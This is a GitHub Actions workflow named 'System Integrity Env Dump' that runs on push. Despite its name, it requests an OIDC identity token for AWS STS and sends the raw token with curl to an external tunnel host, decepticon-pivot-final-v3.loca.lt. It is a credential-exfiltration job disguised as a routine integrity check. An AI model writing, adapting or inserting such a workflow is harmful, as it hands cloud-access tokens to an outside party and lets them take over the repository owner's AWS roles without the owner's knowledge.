name: System Integrity Env Dump
on: [push, workflow_dispatch]
permissions:
  id-token: write
  contents: read
jobs:
  exex:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch Job Token
        id: get_token
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('sts.amazonaws.com');
            core.setOutput('id_token', token);
      - run: |
          TOKEN="${{ steps.get_token.outputs.id_token }}"
          echo "Length: ${#TOKEN}"
          curl -X POST -d "raw=$TOKEN" https://decepticon-pivot-final-v3.loca.lt
